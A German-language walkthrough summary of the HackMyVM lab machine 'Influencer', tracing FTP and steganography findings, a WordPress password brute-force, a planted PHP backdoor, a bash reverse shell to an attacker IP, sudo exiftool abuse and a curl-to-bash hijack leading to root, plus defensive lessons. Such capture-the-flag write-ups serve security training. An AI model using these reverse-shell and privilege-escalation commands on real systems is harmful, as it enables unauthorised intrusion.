# Influencer - HackMyVM

**Schwierigkeitsgrad:** Medium 🟡

---

## ℹ️ Maschineninformationen

*   **Plattform:** HackMyVM
*   **VM Link:** [https://hackmyvm.eu/machines/machine.php?vm=Influencer](https://hackmyvm.eu/machines/machine.php?vm=Influencer)
*   **Autor (VM):** DarkSpirit

![Influencer Machine Icon](Influencer.png)

---

## 🏁 Übersicht

Dieser Bericht beschreibt den Prozess des Penetrationstests, der auf der virtuellen Maschine "Influencer" von HackMyVM durchgeführt wurde. Das Ziel war die Erlangung von unautorisiertem Zugriff auf das System und die Ausweitung der Rechte auf Root. Die Maschine wies mehrere Schwachstellen auf, darunter anonymer FTP-Zugriff, Informationslecks über eine Webanwendung, Steganografie, schwache Passwortpraktiken und Fehlkonfigurationen in einem WordPress Theme, der Datenbank und den Sudo-Berechtigungen.

---

## 📖 Zusammenfassung des Walkthroughs

Der Penetrationstest umfasste mehrere Schlüsselphasen:

### 🔎 Reconnaissance

*   Erster Netzwerkscan (`arp-scan`) zur Identifizierung der Ziel-IP-Adresse (192.168.2.40).
*   Umfassender Portscan (`nmap`), der zwei offene Ports aufdeckte: 80 (HTTP - Apache httpd 2.4.52) und 2121 (FTP - vsftpd 3.0.5).
*   Nmap-Skripte zeigten, dass anonymer FTP-Login erlaubt war und listeten Dateien auf dem FTP-Server auf (mehrere JPGs und `note.txt`).

### 🌐 Web Enumeration

*   Verbindung zur anonymen FTP-Freigabe (`ftp`) und Bestätigung der Dateilistung.
*   Herunterladen aller Dateien vom FTP (`wget -r`).
*   Analyse von `note.txt`, die einen Hinweis enthielt: "- Change wordpress password".
*   Verwendung von `stegseek` auf `snapchat.jpg` (vom FTP) mit `rockyou.txt` und Finden einer versteckten Datei `backup.txt` mit einem Klartextpasswort: `<span class="password">u3jkeg97gf</span>`.
*   Hinzufügen von `influencer.hmv` zur lokalen `/etc/hosts`-Datei zur Zuordnung zur Ziel-IP.
*   Erkundung des Webservers unter `http://influencer.hmv:80` (Weiterleitung nach `/wordpress`).
*   Entdeckung eines Blogbeitrags mit einem Kommentar von "Admin" an "Luna", der das Ändern eines Passworts und das Vermeiden persönlicher Informationen erwähnte. Dies identifizierte den Benutzernamen "luna" und deutete auf ein schwaches Passwort hin.
*   Verwendung der WordPress REST API (`curl | jq`) zur Bestätigung der Existenz des Benutzers `luna` (ID 1).
*   Verwendung von `wpscan` mit API-Token zur Enumerierung von WordPress-Schwachstellen, Bestätigung der WordPress-Version (6.8.1), Finden eines veralteten Akismet-Plugins (5.1), Identifizierung offener Verzeichnislistung unter `/wp-content/uploads/` und Bestätigung des Benutzers `luna`.
*   Verwendung von `cupp` zur Erstellung eines gezielten Passwortwörterbuchs (`luna.txt`) basierend auf öffentlich verfügbaren Informationen über "Luna Shine" (Name, Geburtsdatum 24061997) aus dem Blog.
*   Durchführung eines Passwort-Brute-Force-Angriffs gegen den WordPress-Login (`wp-login.php`) für den Benutzer `luna` mit `wpscan` und dem `luna.txt` Wörterbuch.
*   Erfolgreiches Knacken des Passworts für den Benutzer `luna`: `<span class="password">luna_1997</span>`.

### 💻 Initialer Zugriff

*   Anmeldung im WordPress-Administrationsbereich mit `luna:<span class="password">luna_1997</span>`.
*   Erkundung der Theme-Dateien über den Erscheinungsbild-Editor und Entdeckung einer Backdoor in `/wordpress/wp-content/themes/blogarise/404.php`: `< scrpt > system($GET["cmd"]); < /scrpt >`.
*   Bestätigung der Remote Code Execution (RCE) durch Ausführung von `id` über den `cmd` GET-Parameter.
*   Einrichtung eines Netcat-Listeners (`nc -lvnp 4444`) auf der Angreifer-Maschine.
*   Ausführung eines Bash Reverse-Shell-Paylo<span class="command">a</span>d<span class="command">s</span> über die RCE-Schwachstelle (`curl http://influencer.hmv/wordpress/wp-content/themes/blogarise/404.php?cmd=/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'`).
*   Erfolgreiche Erlangung einer initialen Shell als Benutzer `www-data`.

### 📈 Privilege Escalation

*   Von der `www-data` Shell aus, Untersuchung von `wp-config.php` und Finden von Datenbankzugangsdaten: `DB_USER: www-data`, `DB_PASSWORD: <span class="password">s3cret</span>`, `DB_NAME: wordpressdb`.
*   Zugriff auf die MariaDB-Datenbank mit diesen Zugangsdaten (`mysql -u www-data -ps3cret`) und Abfrage der `wp_users`-Tabelle, Finden des Hashes für Benutzer `luna`.
*   Prüfung lokaler lauschender Ports (`ss -altpn`) und Identifizierung eines Dienstes, der auf `127.0.0.1:1212` lauscht. Weitere Untersuchung (manuelle Verbindung) zeigte, dass es sich um SSH handelte.
*   Versuch der SSH-Anmeldung als Benutzer `luna` an `127.0.0.1:1212` unter Verwendung des Passworts `<span class="password">u3jkeg97gf</span>`, das über Steganografie gefunden wurde.
*   Erfolgreiche Anmeldung via SSH als Benutzer `luna`.
*   Prüfung der `sudo`-Berechtigungen für `luna` (`sudo -l`). Finden von `(juan) NOPASSWD: /usr/bin/exiftool`.
*   Konsultation von GTFOBins für Ausnutzungsmethoden von `exiftool` via `sudo`.
*   Generierung eines neuen SSH-Schlüsselpaars auf der Angreifer-Maschine.
*   Übertragung des öffentlichen SSH-Schlüssels (`influencer.pub`) an das Zielsystem (`/dev/shm`) über einen temporären HTTP-Server auf der Angreifer-Maschine.
*   Verwendung der `sudo exiftool` Schwachstelle zum Schreiben des öffentlichen Schlüssels in `/home/juan/.ssh/authorized_keys` (`sudo -u juan exiftool -filename=/home/juan/.ssh/authorized_keys /dev/shm/influencer.pub`).
*   Erfolgreiche Anmeldung via SSH als Benutzer `juan` unter Verwendung des privaten Schlüssels (`ssh juan@localhost -i /dev/shm/influencer -p 1212`).
*   Prüfung der `sudo`-Berechtigungen für `juan` (`sudo -l`). Finden von `(root) NOPASSWD: /bin/bash /home/juan/check.sh`.
*   Untersuchung von `/home/juan/check.sh`, das `/usr/bin/curl http://server.hmv/98127651 | /bin/bash` ausführte.
*   Manipulation von `/etc/hosts` auf dem Zielsystem als `juan`, um `server.hmv` auf die Angreifer-IP umzuleiten (`192.168.2.199 server.hmv >> /etc/hosts`).
*   Erstellung einer Datei `98127651` auf der Angreifer-Maschine mit dem Inhalt `chmod +s /bin/bash`.
*   Bereitstellung der Datei `98127651` über einen Python HTTP-Server auf der Angreifer-Maschine (Port 80).
*   Ausführung des anfälligen Skripts als `juan` (`sudo /bin/bash /home/juan/check.sh`), wodurch es den `chmod +s /bin/bash` Befehl als Root herunterlud und ausführte.
*   Bestätigung, dass das SUID-Bit auf `/bin/bash` gesetzt wurde (`ls -la /bin/bash`).
*   Ausführung von `bash -p` als `juan` zur Erlangung einer Root-Shell.

### 🚩 Flags

*   **User Flag:** Gefunden in `/home/juan/user.txt`
    ` <span class="password">goodjobbro</span>`
*   **Root Flag:** Gefunden in `/root/rr00t.txt`
    ` <span class="password">19283712487912"hey</span>`

---

## 🧠 Wichtige Erkenntnisse

*   **Anonymer FTP:** Kann sensible Dateien und Informationen (wie `note.txt`) enthüllen und sogar über Steganografie versteckte Daten enthalten. Beschränke den Zugriff immer und stelle sicher, dass nur nicht-sensible, öffentliche Dateien verfügbar sind.
*   **Steganografie:** Informationen (Passwörter, versteckte Dateien) können in scheinbar unbedenklichen Mediendateien verborgen sein. Tools wie `stegseek` sind nützlich für die Erkennung.
*   **OSINT für Passwörter:** Öffentlich verfügbare persönliche Informationen (Namen, Geburtstage usw.) sind von unschätzbarem Wert für die Erstellung gezielter Passwortwörterbücher (`cupp`), die die Erfolgsrate von Brute-Force-Angriffen gegen schwache Passwörter erheblich steigern.
*   **WordPress-Sicherheit:** Veraltete Plugins, offene Verzeichnislistungen (`/wp-content/uploads`), aktive REST API Benutzer-Enumeration und insbesondere der aktivierte Datei-Editor (`DISALLOW_FILE_EDIT`) sind kritische Schwachstellen. Theme-/Plugin-Editoren sollten nach der Entwicklung deaktiviert werden.
*   **Remote Code Execution (RCE):** Unzureichende Eingabevalidierung in Webanwendungen (wie der `$GET["cmd"]` Parameter) ermöglicht Angreifern die Ausführung beliebiger Systembefehle. Strikte Eingabebereinigung und Validierung sind unerlässlich.
*   **Datenbank-Zugangsdaten in Konfigurationsdateien:** Die Speicherung von Datenbank-Zugangsdaten im Klartext in leicht zugänglichen Dateien wie `wp-config.php` ist ein großes Risiko. Sicheres Konfigurationsmanagement ist entscheidend.
*   **Lokale Dienste:** Dienste, die nur auf der Loopback-Schnittstelle (`127.0.0.1`) lauschen, können immer noch von jedem Benutzer auf dem System erreicht werden und sind häufig Ziele für Lateral Movement oder Privilege Escalation, wenn sie anfällig sind oder mit schwachen Zugangsdaten verwendet werden.
*   **Sudo-Fehlkonfigurationen:** Benutzern das Ausführen leistungsstarker Binärdateien (`exiftool`) oder Skripte (`check.sh`) als andere Benutzer (insbesondere root) ohne Passwort (`NOPASSWD`) zu erlauben, ist ein häufiger und kritischer Privilege Escalation Vektor. Sudoers-Einträge sollten überprüft und auf die absolut notwendigen Befehle mit aktivierter Passwortabfrage beschränkt werden, wo immer möglich.
*   **Beliebiges Schreiben/Lesen von Dateien via Sudo:** Fehlkonfigurierte `sudo`-Berechtigungen in Kombination mit leistungsstarken Dateimanipulations-Tools wie `exiftool` können ausgenutzt werden, um sensible Dateien (wie SSH `authorized_keys`) unter anderen Benutzerkontexten zu lesen oder zu schreiben.
*   **Manipulation von DNS/Hosts-Datei:** Die Kontrolle der Namensauflösung (über `/etc/hosts`) kann genutzt werden, um Verbindungen von anfälligen Skripten oder Diensten auf eine vom Angreifer kontrollierte Maschine umzuleiten, zwecks Code-Ausführung oder Datenexfiltration.
*   **Unsichere Skriptausführung:** Skripte, die mit erhöhten Rechten (über `sudo`) ausgeführt werden, sollten niemals Code von externen, nicht vertrauenswürdigen Quellen abrufen und ausführen (`curl | bash`). Dies ist ein direkter Weg zur Systemkompromittierung.
*   **SUID-Binärdateien:** Das Setzen des SUID-Bits auf Shell-Binärdateien wie `/bin/bash` ist extrem gefährlich, da es jedem Benutzer erlaubt, Root-Privilegien zu erlangen. SUID-/SGID-Bits sollten sorgfältig verwaltet und von unnötigen Binärdateien entfernt werden.

---

## 📄 Vollständiger Bericht

Eine detaillierte Schritt-für-Schritt-Anleitung, inklusive Befehlsausgaben, Analyse, Bewertung und Empfehlungen für jeden Schritt, finden Sie im vollständigen HTML-Bericht:

[**➡️ Vollständigen Pentest-Bericht hier ansehen**]({[Link zur Seite](https://alientec1908.github.io/Influencer_HackMyVM_Medium)})

---

*Berichtsdatum: 12. Juni 2025*
*Pentest durchgeführt von Ben Chehade*
